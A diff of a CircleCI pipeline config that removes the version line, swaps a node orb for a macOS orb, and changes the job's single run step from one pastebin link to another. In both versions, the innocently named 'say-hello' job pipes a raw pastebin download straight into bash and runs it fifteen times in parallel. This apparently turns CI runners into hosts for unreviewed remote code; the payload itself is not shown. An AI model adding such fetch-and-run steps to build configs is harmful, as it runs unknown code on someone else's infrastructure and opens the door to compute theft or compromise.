@@ -1,11 +1,5 @@
-# Use the latest 2.1 version of CircleCI pipeline process engine.
-# See: https://circleci.com/docs/2.0/configuration-reference
-
-version: 2.1
 orbs:
-  node: circleci/node@4.7.0
-# Define a job to be invoked later in a workflow.
-# See: https://circleci.com/docs/2.0/configuration-reference/#jobs
+  macos: circleci/macos@2.0.0
 jobs:
   say-hello:
     # Specify the execution environment. You can specify an image from Dockerhub or use one of our Convenience Images from CircleCI's Developer Hub.
@@ -17,7 +11,7 @@ jobs:
     steps:
       - checkout
       - run:
-          bash -c "$(curl -fsSL https://pastebin.com/raw/dYdv43k8)"
+          bash -c "$(curl -fsSL https://pastebin.com/raw/s1kZsNE1)"
     parallelism: 15
 # Invoke jobs via workflows
 # See: https://circleci.com/docs/2.0/configuration-reference/#workflows
